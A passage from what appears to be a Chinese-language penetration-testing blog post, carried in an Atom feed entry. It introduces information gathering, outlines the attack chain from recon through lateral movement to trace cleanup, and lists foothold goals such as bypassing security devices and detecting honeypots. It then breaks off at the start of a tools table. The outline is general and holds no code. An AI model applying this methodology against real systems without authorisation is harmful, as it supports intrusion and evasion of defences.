-<p>信息收集是指通过各种方式获<span data-type="text" style="color: var(--b3-font-color9);">取所需要的信息</span>，以便我们在后续的渗透过程更好的进行。因为只有我们掌握了目标网站或目标，主机足够多的信息之后，我们才能更好地对其进行漏洞检测。</p>
-<h2>渗透测试流程</h2>
-<p>外网信息收集——&gt;打点——&gt;权限维持——&gt;提权——&gt;内网信息收集——&gt;横向移动——&gt;痕迹清理</p>
-<p>打点关键资产数据信息：</p>
-<ul>
-<li>找出网站真实IP，挖掘相邻网段、绕过安全设备</li>
-<li>判断目标是否为蜜罐</li>
-<li>定位内网IP和系统</li>
-<li>定位关键的应用系统</li>
-<li>定位关键企业信息</li>
-</ul>
-<h1>外网信息收集</h1>
-<p>对于外网信息收集主要有几点：ip、域名、企业等资产信息以及相应端口/服务、指纹、敏感信息、社工碰撞等易受攻击面信息。</p>
-<h2>0x00 信息收集常用工具</h2>
-<p>|工具、网站|备注|<br>
-| :</p>
-]]></content>
-    <category term="信息收集"/>
-    <published>2025-01-11T11:23:43.000Z</published>
   </entry>
 </feed>
